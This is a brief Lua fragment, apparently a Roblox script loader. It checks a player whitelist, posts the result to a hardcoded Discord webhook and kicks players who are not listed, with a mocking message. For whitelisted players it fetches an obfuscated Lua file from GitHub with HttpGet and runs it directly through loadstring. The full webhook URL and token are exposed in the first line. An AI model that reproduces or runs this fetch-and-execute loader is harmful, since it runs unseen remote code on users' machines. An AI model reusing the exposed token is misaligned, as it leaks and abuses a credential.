local webhook = "https://discord.com/api/webhooks/1471851459279720574/UTdxu0Hfeoidj-sKJCrxECZPAMyBcs5Qn8P0lbuBTgFAiemWMhDFfW8IOrbSiQ_41Z55"
...
if isWhitelisted then
    sendLog("PASOK")
   loadstring(game:HttpGet("https://raw.githubusercontent.com/dezqpal/Primo/refs/heads/main/KAINOobsfucator.lua "))() 
else
    sendLog("NAGTANGKA")
    player:Kick("😝SIGE GAMIT PA PURO KA LIBRE🤪")
end
